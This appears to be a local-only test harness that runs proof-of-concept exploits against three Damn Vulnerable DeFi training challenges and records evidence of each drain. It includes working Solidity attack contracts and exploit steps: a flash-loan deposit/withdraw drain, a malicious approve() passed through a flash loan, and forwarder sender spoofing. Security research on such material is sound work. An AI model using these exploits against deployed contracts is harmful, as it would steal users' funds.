'use strict';

// Execute the pinned Damn Vulnerable DeFi PoCs against a local-only Hardhat EVM.
// The Python wrapper owns compiler selection and evidence persistence; this file
// deliberately emits one JSON result and never talks to an RPC endpoint.
const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
const hre = require(path.join(deps, 'hardhat'));
const { BrowserProvider, ContractFactory, Wallet, parseEther, ZeroAddress } = require(path.join(deps, 'ethers'));
const solcBase = require(path.join(root, 'flare-scan/tools/solc-0819/node_modules/solc'));
const solc = solcBase.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

const CHALLENGES = new Set(['side-entrance', 'naive-receiver', 'truster']);
const E18 = 10n ** 18n;
const COMPILER_SETTINGS = Object.freeze({
  optimizer: { enabled: true, runs: 200 },
  metadata: { bytecodeHash: 'none' },
  outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } },
});

function sha256(value) { return crypto.createHash('sha256').update(value).digest('hex'); }
function readSources(bundleDir) {
  const sources = {};
  const inputPath = path.join(bundleDir, 'static-input.json');
  if (fs.existsSync(inputPath)) {
    const input = JSON.parse(fs.readFileSync(inputPath, 'utf8'));
    for (const [name, row] of Object.entries(input.sources || {})) {
      if (typeof row?.content !== 'string') throw new Error(`dvd_source_unit_invalid:${name}`);
      sources[name] = { content: row.content };
    }
    if (!Object.keys(sources).length) throw new Error('dvd_dependency_bundle_empty');
    return sources;
  }
  function walk(dir) {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) walk(full);
      else if (entry.isFile() && entry.name.endsWith('.sol')) {
        const key = path.relative(bundleDir, full).split(path.sep).join('/');
        if (!sources[key]) sources[key] = { content: fs.readFileSync(full, 'utf8') };
      }
    }
  }
  walk(bundleDir);
  if (!Object.keys(sources).length) throw new Error('dvd_dependency_bundle_empty');
  return sources;
}
function compile(sources) {
  const input = {
    language: 'Solidity', sources,
    settings: COMPILER_SETTINGS,
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter((row) => row.severity === 'error');
  if (errors.length) throw new Error(`dvd_compile_failed:${errors.map((row) => row.formattedMessage).join('\n')}`);
  return output;
}
function artifact(output, sourceName, contractName) {
  const row = output.contracts?.[sourceName]?.[contractName];
  if (!row?.abi || !row.evm?.bytecode?.object) throw new Error(`dvd_artifact_missing:${sourceName}:${contractName}`);
  return row;
}
function assertRow(name, expected, actual) {
  const expectedText = typeof expected === 'bigint' ? expected.toString() : String(expected);
  const actualText = typeof actual === 'bigint' ? actual.toString() : String(actual);
  return { name, expected: expectedText, actual: actualText, passed: expectedText === actualText };
}
async function deploy(output, sourceName, contractName, signer, args = [], overrides = {}) {
  const row = artifact(output, sourceName, contractName);
  const deployArgs = Object.keys(overrides).length ? [...args, overrides] : args;
  const contract = await new ContractFactory(row.abi, row.evm.bytecode.object, signer).deploy(...deployArgs);
  await contract.waitForDeployment();
  return contract;
}
async function transactionEvidence(provider, receipt) {
  const result = { transactionHash: receipt.hash, status: Number(receipt.status), gasUsed: receipt.gasUsed.toString() };
  if (result.status !== 1) {
    try {
      const trace = await provider.send('debug_traceTransaction', [receipt.hash, {}]);
      result.revertTrace = (trace.structLogs || []).slice(-12).map((row) => ({ op: row.op, depth: row.depth, error: row.error || null }));
      result.returnValue = trace.returnValue || null;
    } catch (error) {
      result.traceUnavailable = String(error?.message || error).slice(0, 240);
    }
  }
  return result;
}
function addressOf(value) { return value.toLowerCase(); }
function requestTypes() {
  return { Request: [
    { name: 'from', type: 'address' }, { name: 'target', type: 'address' },
    { name: 'value', type: 'uint256' }, { name: 'gas', type: 'uint256' },
    { name: 'nonce', type: 'uint256' }, { name: 'data', type: 'bytes' },
    { name: 'deadline', type: 'uint256' },
  ] };
}

async function runSide(output, provider, deployer, player, recovery, boundary) {
  const poolSource = 'src/side-entrance/SideEntranceLenderPool.sol';
  const attackSource = 'PoCSideEntrance.sol';
  const attackCode = `pragma solidity =0.8.25;
interface ILender { function flashLoan(uint256 amount) external; function deposit() external payable; function withdraw() external; }
interface IReceiver { function execute() external payable; }
contract PoCSideEntrance is IReceiver {
  ILender immutable pool; address payable immutable recovery;
  constructor(address p, address payable r) { pool = ILender(p); recovery = r; }
  function attack(uint256 amount) external { pool.flashLoan(amount); pool.withdraw(); }
  function execute() external payable { pool.deposit{value: msg.value}(); }
  receive() external payable { (bool ok,) = recovery.call{value: msg.value}(""); require(ok); }
}`;
  const attackOutput = compile({ [attackSource]: { content: attackCode } });
  // Compile the attacker independently so target source hashes never include PoC code.
  const pool = await deploy(output, poolSource, 'SideEntranceLenderPool', deployer);
  const poolAddress = await pool.getAddress();
  const realAttack = await deploy(attackOutput, attackSource, 'PoCSideEntrance', player, [poolAddress, recovery]);
  await (await pool.connect(deployer).deposit({ value: 1000n * E18 })).wait();
  const beforePool = await provider.getBalance(poolAddress);
  const beforeRecovery = await provider.getBalance(recovery);
  await realAttack.connect(player).attack.staticCall(beforePool);
  const receipt = await (await realAttack.connect(player).attack(beforePool, { gasLimit: 1_000_000n })).wait();
  const txEvidence = await transactionEvidence(provider, receipt);
  const afterPool = await provider.getBalance(poolAddress, receipt.blockNumber);
  const afterRecovery = await provider.getBalance(recovery, receipt.blockNumber);
  const assertions = [assertRow('pool_balance_zero', 0n, afterPool), assertRow('recovery_balance_gain', 1000n * E18, afterRecovery - beforeRecovery)];
  return { challenge: 'side-entrance', vulnerability: 'side_entrance_flash_loan_accounting', targetAddress: poolAddress,
    transactionHashes: [receipt.hash], transactions: [txEvidence], before: { poolBalance: beforePool.toString(), recoveryBalance: beforeRecovery.toString() },
    after: { poolBalance: afterPool.toString(), recoveryBalance: afterRecovery.toString() }, assertions,
    confirmedVulnerability: txEvidence.status === 1 && assertions.every((row) => row.passed),
    reason: txEvidence.status === 1 ? null : `exploit_transaction_reverted:${JSON.stringify(txEvidence)}`,
    reproduction: 'flashLoan(amount) -> callback deposit(amount) -> withdraw() -> recovery' };
}

async function runTruster(output, provider, deployer, player, recovery, boundary) {
  const tokenSource = 'src/DamnValuableToken.sol';
  const poolSource = 'src/truster/TrusterLenderPool.sol';
  const attackSource = 'PoCTruster.sol';
  const attackCode = `pragma solidity =0.8.25;
interface IERC20 { function transferFrom(address from, address to, uint256 amount) external returns (bool); }
interface IPool { function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool); }
contract PoCTruster { function attack(address pool, address token, address recovery, uint256 amount) external { bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount); IPool(pool).flashLoan(0, address(this), token, data); require(IERC20(token).transferFrom(pool, recovery, amount)); } }
`;
  const attackOutput = compile({ [attackSource]: { content: attackCode } });
  const token = await deploy(output, tokenSource, 'DamnValuableToken', deployer);
  const pool = await deploy(output, poolSource, 'TrusterLenderPool', deployer, [await token.getAddress()]);
  const poolAddress = await pool.getAddress();
  const tokenAddress = await token.getAddress();
  await (await token.connect(deployer).transfer(poolAddress, 1_000_000n * E18)).wait();
  const attacker = await deploy(attackOutput, attackSource, 'PoCTruster', deployer);
  const beforePool = await token.balanceOf(poolAddress);
  const beforeRecovery = await token.balanceOf(recovery);
  const receipt = await (await attacker.connect(player).attack(poolAddress, tokenAddress, recovery, beforePool, { gasLimit: 1_000_000n })).wait();
  const txEvidence = await transactionEvidence(provider, receipt);
  const afterPool = await token.balanceOf(poolAddress, { blockTag: receipt.blockNumber });
  const afterRecovery = await token.balanceOf(recovery, { blockTag: receipt.blockNumber });
  const assertions = [assertRow('pool_token_balance_zero', 0n, afterPool), assertRow('recovery_token_balance_gain', beforePool, afterRecovery - beforeRecovery)];
  return { challenge: 'truster', vulnerability: 'arbitrary_target_call_in_flash_loan', targetAddress: poolAddress,
    tokenAddress, transactionHashes: [receipt.hash], transactions: [txEvidence], before: { poolTokenBalance: beforePool.toString(), recoveryTokenBalance: beforeRecovery.toString() },
    after: { poolTokenBalance: afterPool.toString(), recoveryTokenBalance: afterRecovery.toString() }, assertions,
    confirmedVulnerability: txEvidence.status === 1 && assertions.every((row) => row.passed),
    reason: txEvidence.status === 1 ? null : `exploit_transaction_reverted:${JSON.stringify(txEvidence)}`,
    reproduction: 'flashLoan(0, attacker, token, approve(attacker, amount)) -> transferFrom(pool, recovery, amount)' };
}

async function runNaive(output, provider, deployer, player, recovery, boundary) {
  const poolSource = 'src/naive-receiver/NaiveReceiverPool.sol';
  const forwarderSource = 'src/naive-receiver/BasicForwarder.sol';
  const receiverSource = 'src/naive-receiver/FlashLoanReceiver.sol';
  const wethSource = 'solmate/tokens/WETH.sol';
  const forwarder = await deploy(output, forwarderSource, 'BasicForwarder', deployer);
  const weth = await deploy(output, wethSource, 'WETH', deployer);
  const pool = await deploy(output, poolSource, 'NaiveReceiverPool', deployer, [await forwarder.getAddress(), await weth.getAddress(), await deployer.getAddress()], { value: 1000n * E18 });
  const receiver = await deploy(output, receiverSource, 'FlashLoanReceiver', deployer, [await pool.getAddress()]);
  await (await weth.connect(deployer).deposit({ value: 10n * E18 })).wait();
  await (await weth.connect(deployer).transfer(await receiver.getAddress(), 10n * E18)).wait();
  const forwarderAddress = await forwarder.getAddress();
  const poolAddress = await pool.getAddress();
  const wethAddress = await weth.getAddress();
  const receiverAddress = await receiver.getAddress();
  const recoveryAddress = await recovery.getAddress();
  const deployerAddress = await deployer.getAddress();
  const nonce0 = await forwarder.nonces(await player.getAddress());
  const loan = pool.interface.encodeFunctionData('flashLoan', [receiverAddress, wethAddress, 0n, '0x']);
  const batch = pool.interface.encodeFunctionData('multicall', [[loan, loan, loan, loan, loan, loan, loan, loan, loan, loan]]);
  const chainId = Number((await provider.getNetwork()).chainId);
  const domain = { name: 'BasicForwarder', version: '1', chainId, verifyingContract: forwarderAddress };
  const gas = 2_000_000n;
  const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
  const sign = async (from, target, data, nonce) => {
    const request = { from, target, value: 0n, gas, nonce, data, deadline };
    const signature = await player.signTypedData(domain, requestTypes(), request);
    return { request, signature };
  };
  const first = await sign(await player.getAddress(), poolAddress, batch, nonce0);
  const firstReceipt = await (await forwarder.connect(player).execute(first.request, first.signature, { gasLimit: gas + 500_000n })).wait();
  const firstTxEvidence = await transactionEvidence(provider, firstReceipt);
  const feeDeposit = await pool.deposits(deployerAddress, { blockTag: firstReceipt.blockNumber });
  const receiverAfterFees = await weth.balanceOf(receiverAddress, { blockTag: firstReceipt.blockNumber });
  const withdrawRaw = pool.interface.encodeFunctionData('withdraw', [1010n * E18, recoveryAddress]);
  const withdrawSpoofed = `${withdrawRaw}${deployerAddress.slice(2)}`;
  const withdrawBatch = pool.interface.encodeFunctionData('multicall', [[withdrawSpoofed]]);
  const second = await sign(await player.getAddress(), poolAddress, withdrawBatch, nonce0 + 1n);
  const secondReceipt = await (await forwarder.connect(player).execute(second.request, second.signature, { gasLimit: gas + 500_000n })).wait();
  const secondTxEvidence = await transactionEvidence(provider, secondReceipt);
  const poolAfter = await weth.balanceOf(poolAddress, { blockTag: secondReceipt.blockNumber });
  const recoveryAfter = await weth.balanceOf(recoveryAddress, { blockTag: secondReceipt.blockNumber });
  const assertions = [assertRow('receiver_drained_by_ten_zero_loans', 0n, receiverAfterFees), assertRow('pool_token_balance_zero', 0n, poolAfter), assertRow('recovery_token_balance_gain', 1010n * E18, recoveryAfter)];
  return { challenge: 'naive-receiver', vulnerability: 'unrestricted_flash_loan_receiver_fee_drain', targetAddress: poolAddress,
    tokenAddress: wethAddress, transactionHashes: [firstReceipt.hash, secondReceipt.hash], transactions: [firstTxEvidence, secondTxEvidence], nonceBefore: nonce0.toString(), nonceAfter: (await forwarder.nonces(await player.getAddress(), { blockTag: secondReceipt.blockNumber })).toString(),
    before: { poolTokenBalance: (1000n * E18).toString(), receiverTokenBalance: (10n * E18).toString() },
    after: { poolTokenBalance: poolAfter.toString(), receiverTokenBalance: receiverAfterFees.toString(), feeReceiverDeposit: feeDeposit.toString(), recoveryTokenBalance: recoveryAfter.toString() }, assertions,
    confirmedVulnerability: firstTxEvidence.status === 1 && secondTxEvidence.status === 1 && assertions.every((row) => row.passed),
    reason: firstTxEvidence.status !== 1 || secondTxEvidence.status !== 1 ? 'forwarded_exploit_transaction_reverted' : null,
    reproduction: 'ten zero-value flash loans via signed forwarder multicall, then spoof feeReceiver in a delegated withdraw' };
}

(async () => {
  const challenge = process.argv[2];
  const bundleDir = path.resolve(process.argv[3] || '');
  if (!CHALLENGES.has(challenge)) throw new Error(`unsupported_dvd_challenge:${challenge}`);
  if (!fs.statSync(bundleDir).isDirectory()) throw new Error('dvd_bundle_directory_missing');
  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('dvd_dynamic_requires_isolated_local_evm');
  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) throw new Error('dvd_evm_not_isolated');
  const provider = new BrowserProvider(hre.network.provider, undefined, { cacheTimeout: -1 });
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('dvd_chain_id_mismatch');
  const signers = await Promise.all([0, 1, 2].map((index) => provider.getSigner(index)));
  const [deployer, player, recovery] = signers;
  const sources = readSources(bundleDir);
  const sourceNames = Object.keys(sources).sort();
  const manifest = JSON.parse(fs.readFileSync(path.join(root, 'training-data/damn-vulnerable-defi/manifest.json'), 'utf8'));
  const sample = (manifest.samples || []).find((row) => row.challenge === challenge);
  if (!sample || sample.commit !== manifest.commit) throw new Error('dvd_manifest_sample_missing_or_unpinned');
  for (const file of sample.sourceFiles || []) {
    const objectPath = path.resolve(root, file.objectPath);
    const content = fs.readFileSync(objectPath, 'utf8');
    if (sha256(content) !== file.sha256) throw new Error(`dvd_target_source_hash_mismatch:${file.path}`);
    const bundled = sources[file.path]?.content;
    if (bundled !== content) throw new Error(`dvd_bundle_target_source_mismatch:${file.path}`);
  }
  const sourceBundleSha256 = sample.sourceBundleSha256;
  const listedBundleFiles = sample.analysisBundle?.files || [];
  for (const file of listedBundleFiles) {
    const bundlePath = path.resolve(root, file.path);
    const content = fs.readFileSync(bundlePath, 'utf8');
    if (sha256(content) !== file.sha256) throw new Error(`dvd_bundle_source_hash_mismatch:${file.sourceUnit}`);
    if (sources[file.sourceUnit]?.content !== content) throw new Error(`dvd_static_input_source_mismatch:${file.sourceUnit}`);
  }
  const inputPath = path.resolve(root, sample.analysisBundle?.inputPath || '');
  if (inputPath !== path.join(bundleDir, 'static-input.json')
      || sha256(fs.readFileSync(inputPath)) !== sample.analysisBundle?.inputSha256) {
    throw new Error('dvd_static_input_hash_mismatch');
  }
  for (const dependency of sample.dependencyFiles || []) {
    const objectContent = fs.readFileSync(path.resolve(root, dependency.objectPath));
    if (sha256(objectContent) !== dependency.sha256) throw new Error(`dvd_dependency_object_hash_mismatch:${dependency.importPath}`);
    const bundled = sources[dependency.compilerSourceUnit]?.content;
    if (typeof bundled !== 'string' || sha256(bundled) !== dependency.sha256) {
      throw new Error(`dvd_dependency_source_unit_mismatch:${dependency.importPath}`);
    }
  }
  const recomputedDependencyBundleSha256 = sha256(Object.keys(sources).sort()
    .map((name) => `${name}:${sha256(sources[name].content)}\n`).join(''));
  if (recomputedDependencyBundleSha256 !== sourceBundleSha256) {
    throw new Error(`dvd_dependency_bundle_hash_mismatch:${recomputedDependencyBundleSha256}:${sourceBundleSha256}`);
  }
  const targetSourceBundleSha256 = sha256((sample.sourceFiles || [])
    .map((file) => `${file.path}:${file.sha256}\n`).join(''));
  const dependencyBundleSha256 = sample.analysisBundle?.sourceBundleSha256 || sourceBundleSha256;
  const compilationInputSha256 = sha256(JSON.stringify({
    language: 'Solidity',
    sources: Object.fromEntries(sourceNames.map((name) => [name, sources[name].content])),
    settings: COMPILER_SETTINGS,
  }));
  const output = compile(sources);
  const boundary = publicBoundary(fork, { chainId, forkState: 'not_performed' });
  const result = challenge === 'side-entrance'
    ? await runSide(output, provider, deployer, player, await recovery.getAddress(), boundary)
    : challenge === 'truster'
      ? await runTruster(output, provider, deployer, player, await recovery.getAddress(), boundary)
      : await runNaive(output, provider, deployer, player, recovery, boundary);
  const artifact = { version: process.env.DVD_COMPILER_VERSION || solc.version(), sha256: process.env.DVD_COMPILER_SHA256 || null, kind: 'solc-js-original-source' };
  process.stdout.write(`${JSON.stringify({ schemaVersion: 1, state: result.confirmedVulnerability ? 'confirmed' : 'failed', ...result,
    sourceBundleSha256, dependencyBundleSha256, targetSourceBundleSha256,
    staticInputSha256: sample.analysisBundle?.inputSha256 || null, compilationInputSha256,
    compilerArtifact: artifact, executionBoundary: boundary })}\n`);
  if (!result.confirmedVulnerability) process.exitCode = 1;
})().catch((error) => { process.stderr.write(`${error.stack || error}\n`); process.exitCode = 1; });
